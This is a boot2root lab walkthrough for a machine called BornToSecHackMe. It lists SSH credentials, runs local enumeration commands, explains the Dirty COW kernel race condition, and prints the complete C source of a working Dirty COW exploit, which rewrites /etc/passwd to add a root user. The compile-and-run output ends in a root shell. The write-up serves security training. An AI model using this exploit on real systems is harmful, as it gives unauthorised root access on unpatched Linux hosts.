

# **Boot2root - Walkthrough2**

Thanks to the first walkthrough, we can now to connect via ssh with three users, Laurie (lmezard), Thor and Zaz. We can proceed to the enumeration of the system. 

## **SSH LOGIN CREDENTIALS**

- **Laurie** | `330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4`
- **Thor** | `Publicspeakingisveryeasy.126241207201b2149opekmq426135`
- **Zaz** | `646da671ca01bb5d84dbb5fb2238dc8e`

## **ENUMERATION**

Now that we have remote access to those three users, we can enumerate their system in order to find some exploitation clues.

- **hostname**

This command returns the hostname of the target machine. Usually useless but it can sometimes provide information about the role of the target in a corporate network.

```
zaz@BornToSecHackMe:~$ hostname
BornToSecHackMe
```

- **uname -a**

This command display system information such as details about the kernel used by the system. This could be useful, we can check if this kernel version is vulnerable to privilege escalation. 

```
zaz@BornToSecHackMe:~$ uname -a
Linux BornToSecHackMe 3.2.0-91-generic-pae #129-Ubuntu SMP Wed Sep 9 11:27:47 UTC 2015 i686 i686 i386 GNU/Linux
```

- **/proc/version**

The proc filesystem gives us more information about the target system processes.

```
zaz@BornToSecHackMe:~$ cat /proc/version
Linux version 3.2.0-91-generic-pae (buildd@lgw01-15) (gcc version 4.6.3 (Ubuntu/Linaro 4.6.3-1ubuntu5) ) #129-Ubuntu SMP Wed Sep 9 11:27:47 UTC 2015
```

- **env**

The env command shows environmental variables. For instance, the PATH variable could have a compiler or a scripting language that we can use to run some code in order to escalate the target's system privilege.

```
zaz@BornToSecHackMe:~$ env
TERM=xterm-256color
SHELL=/bin/bash
SSH_CLIENT=192.168.56.1 36592 22
SSH_TTY=/dev/pts/0
USER=zaz
LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arj=01;31:*.taz=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.zip=01;31:*.z=01;31:*.Z=01;31:*.dz=01;31:*.gz=01;31:*.lz=01;31:*.xz=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.jpg=01;35:*.jpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.axv=01;35:*.anx=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.axa=00;36:*.oga=00;36:*.spx=00;36:*.xspf=00;36:
MAIL=/var/mail/zaz
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games
PWD=/home/zaz
LANG=en_US.UTF-8
SHLVL=1
HOME=/home/zaz
LOGNAME=zaz
SSH_CONNECTION=192.168.56.1 36592 192.168.56.103 22
LESSOPEN=| /usr/bin/lesspipe %s
LESSCLOSE=/usr/bin/lesspipe %s %s
OLDPWD=/home/zaz
_=/usr/bin/env
```

- **sudo -l**

This command gives us all the commands the users can run with root privileges.

```
zaz@BornToSecHackMe:~$ sudo -l
[sudo] password for zaz: 
Sorry, user zaz may not run sudo on BornToSecHackMe.
```


- **ls -la**

This one is pretty common. It's always a good start to look for hidden files.

- **id**

This command provides a general overview of the user’s privilege level and group memberships.

```
zaz@BornToSecHackMe:~$ id
uid=1005(zaz) gid=1005(zaz) groups=1005(zaz)
```

- **/etc/passwd**

Cat the /etc/passwd file can help us to discover users on the system. If a hash password is displayed we can also try to brute-force it.

```
zaz@BornToSecHackMe:~$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
syslog:x:101:103::/home/syslog:/bin/false
messagebus:x:102:106::/var/run/dbus:/bin/false
whoopsie:x:103:107::/nonexistent:/bin/false
landscape:x:104:110::/var/lib/landscape:/bin/false
sshd:x:105:65534::/var/run/sshd:/usr/sbin/nologin
ft_root:x:1000:1000:ft_root,,,:/home/ft_root:/bin/bash
mysql:x:106:115:MySQL Server,,,:/nonexistent:/bin/false
ftp:x:107:116:ftp daemon,,,:/srv/ftp:/bin/false
lmezard:x:1001:1001:laurie,,,:/home/lmezard:/bin/bash
laurie@borntosec.net:x:1002:1002:Laurie,,,:/home/laurie@borntosec.net:/bin/bash
laurie:x:1003:1003:,,,:/home/laurie:/bin/bash
thor:x:1004:1004:,,,:/home/thor:/bin/bash
zaz:x:1005:1005:,,,:/home/zaz:/bin/bash
dovecot:x:108:117:Dovecot mail server,,,:/usr/lib/dovecot:/bin/false
dovenull:x:109:65534:Dovecot login user,,,:/nonexistent:/bin/false
postfix:x:110:118::/var/spool/postfix:/bin/false
```

- **history**

Looking at the commands executed earlier can give us clues about the target system but also, if we're lucky, information has passwords or usernames.

- **find**

Find is a very useful command, used with the right flags we can discover very interesting files. For instance :

(Generic examples)

Find files:

    find . -name flag1.txt: find the file named “flag1.txt” in the current directory
    find /home -name flag1.txt: find the file names “flag1.txt” in the /home directory
    find / -type d -name config: find the directory named config under “/”
    find / -type f -perm 0777: find files with the 777 permissions (files readable, writable, and executable by all users)
    find / -perm a=x: find executable files
    find /home -user frank: find all files for user “frank” under “/home”
    find / -mtime 10: find files that were modified in the last 10 days
    find / -atime 10: find files that were accessed in the last 10 day
    find / -cmin -60: find files changed within the last hour (60 minutes)
    find / -amin -60: find files accesses within the last hour (60 minutes)
    find / -size 50M: find files with a 50 MB size

Folders and files that can be written to or executed from:

    find / -writable -type d 2>/dev/null : Find world-writeable folders
    find / -perm -222 -type d 2>/dev/null: Find world-writeable folders
    find / -perm -o w -type d 2>/dev/null: Find world-writeable folders


Find development tools and supported languages:

    find / -name perl*
    find / -name python*
    find / -name gcc*

Find specific file permissions:

    find / -perm -u=s -type f 2>/dev/null: Find files with the SUID bit, which allows us to run the file with a higher privilege level than the current user. 


Unfortunately nothing of those "basics" steps gives us really interesting except `uname -a`.

Indeed, this command gives us the kernel running on the target machine, `3.2.0-91-generic-pae`. Searching through known exploit, we find the **CVE-2016-5195** best known as dirty cow.

## **DIRTY COW**

This Linux kernel allows processes to write to read only files. Indeed some kernel functions handle the copy-on-write feature of memory mappings, combined with a race condition we can exploit that to become root.

This exploit works like this. First, we create a copy of the read only file we want to write to. This copy will be a private copy of the read only file. We want a copy because we don't have access to the physical memory at our user level, so we won't be able to change any file located there. So we ask the kernel to create for us a private mapping of the file on our virtual memory, it will be done using `mmap`.

To save resources and space, we will get the reference but not the copy until we really write to the copy of the file. But instead the read only file will get marked as `copy on write`. It means that the file will be copied only when we will actually write to it.

Now we want to write to our private mapping. But we won't directly write to the virtual address given by `mmap`, we will write to the file `proc/self/mem` which is the representation of the our `dirty_cow.c` program virtual memory. We're doing that because the vulnerability sits in the way our kernel process-to-process virtual memory access is implemented.

Now the kernel has to find where in the physical memory he should write. Finding that the read only file we want to write to is marked `copy on write`, the copy of the file is finally made and the kernel knows now where he should write. At this point it knows the location but hasn't write anything, because `write` has to steps, first locate the physical address and then write to that address. 

We will take advantages from that and use `mdavise` between those two steps. We will advise the kernel that we don't need anymore our private mapping.

When the second step of `write` happens, the kernel is tricked and thinks the function was aimed to write to the original read only file and actually does it.

Our goal is to get root, so the read only file we will write to is /etc/passwd. We will create a new user, called `root` with a password we''ll choose, give him root permissions and write "its credentials" to the file. That's being made, we will be able to get root.

## **EXPLOITATION**

Thanks to this [**exploit**](https://github.com/firefart/dirtycow) we get this `c` code:

```
#include <fcntl.h>
#include <pthread.h>
#include <string.h>
#include <stdio.h>
#include <stdint.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <sys/ptrace.h>
#include <stdlib.h>
#include <unistd.h>
#include <crypt.h>

const char *filename = "/etc/passwd";
const char *backup_filename = "/tmp/passwd.bak";
const char *salt = "firefart";

int f;
void *map;
pid_t pid;
pthread_t pth;
struct stat st;

struct Userinfo {
   char *username;
   char *hash;
   int user_id;
   int group_id;
   char *info;
   char *home_dir;
   char *shell;
};

char *generate_password_hash(char *plaintext_pw) {
  return crypt(plaintext_pw, salt);
}

char *generate_passwd_line(struct Userinfo u) {
  const char *format = "%s:%s:%d:%d:%s:%s:%s\n";
  int size = snprintf(NULL, 0, format, u.username, u.hash,
    u.user_id, u.group_id, u.info, u.home_dir, u.shell);
  char *ret = malloc(size + 1);
  sprintf(ret, format, u.username, u.hash, u.user_id,
    u.group_id, u.info, u.home_dir, u.shell);
  return ret;
}

void *madviseThread(void *arg) {
  int i, c = 0;
  for(i = 0; i < 200000000; i++) {
    c += madvise(map, 100, MADV_DONTNEED);
  }
  printf("madvise %d\n\n", c);
}

int copy_file(const char *from, const char *to) {
  // check if target file already exists
  if(access(to, F_OK) != -1) {
    printf("File %s already exists! Please delete it and run again\n",
      to);
    return -1;
  }

  char ch;
  FILE *source, *target;

  source = fopen(from, "r");
  if(source == NULL) {
    return -1;
  }
  target = fopen(to, "w");
  if(target == NULL) {
     fclose(source);
     return -1;
  }

  while((ch = fgetc(source)) != EOF) {
     fputc(ch, target);
   }

  printf("%s successfully backed up to %s\n",
    from, to);

  fclose(source);
  fclose(target);

  return 0;
}

int main(int argc, char *argv[])
{
  // backup file
  int ret = copy_file(filename, backup_filename);
  if (ret != 0) {
    exit(ret);
  }

  struct Userinfo user;
  // set values, change as needed
  user.username = "firefart";
  user.user_id = 0;
  user.group_id = 0;
  user.info = "pwned";
  user.home_dir = "/root";
  user.shell = "/bin/bash";

  char *plaintext_pw;

  if (argc >= 2) {
    plaintext_pw = argv[1];
    printf("Please enter the new password: %s\n", plaintext_pw);
  } else {
    plaintext_pw = getpass("Please enter the new password: ");
  }

  user.hash = generate_password_hash(plaintext_pw);
  char *complete_passwd_line = generate_passwd_line(user);
  printf("Complete line:\n%s\n", complete_passwd_line);

  f = open(filename, O_RDONLY);
  fstat(f, &st);
  map = mmap(NULL,
             st.st_size + sizeof(long),
             PROT_READ,
             MAP_PRIVATE,
             f,
             0);
  printf("mmap: %lx\n",(unsigned long)map);
  pid = fork();
  if(pid) {
    waitpid(pid, NULL, 0);
    int u, i, o, c = 0;
    int l=strlen(complete_passwd_line);
    for(i = 0; i < 10000/l; i++) {
      for(o = 0; o < l; o++) {
        for(u = 0; u < 10000; u++) {
          c += ptrace(PTRACE_POKETEXT,
                      pid,
                      map + o,
                      *((long*)(complete_passwd_line + o)));
        }
      }
    }
    printf("ptrace %d\n",c);
  }
  else {
    pthread_create(&pth,
                   NULL,
                   madviseThread,
                   NULL);
    ptrace(PTRACE_TRACEME);
    kill(getpid(), SIGSTOP);
    pthread_join(pth,NULL);
  }

  printf("Done! Check %s to see if the new user was created.\n", filename);
  printf("You can log in with the username '%s' and the password '%s'.\n\n",
    user.username, plaintext_pw);
    printf("\nDON'T FORGET TO RESTORE! $ mv %s %s\n",
    backup_filename, filename);
  return 0;
}
```

We change the value of `const char *salt` and `user.username` to `root` and compile it with the following command `gcc -pthread dirty.c -o exploit -lcrypt`.

```
zaz@BornToSecHackMe:~$ ./exploit
/etc/passwd successfully backed up to /tmp/passwd.bak
Please enter the new password:
Complete line:
root:roN2GPOCKDcvs:0:0:pwned:/root:/bin/bash

mmap: b7fda000
madvise 0

ptrace 0
Done! Check /etc/passwd to see if the new user was created.
You can log in with the username 'root' and the password 'motdepasse'.


DON'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd
Done! Check /etc/passwd to see if the new user was created.
You can log in with the username 'root' and the password 'motdepasse'.


DON'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd
zaz@BornToSecHackMe:~$ su root
Password: 
root@BornToSecHackMe:/home/zaz# id
uid=0(root) gid=0(root) groups=0(root)
```

And we're finally **root** !

## **RESOURCES**

1. [**Dirty Cow doc**](https://www.cs.toronto.edu/~arnold/427/18s/427_18S/indepth/dirty-cow/index.html)
2. [**DirtyCow.c**](https://github.com/firefart/dirtycow)



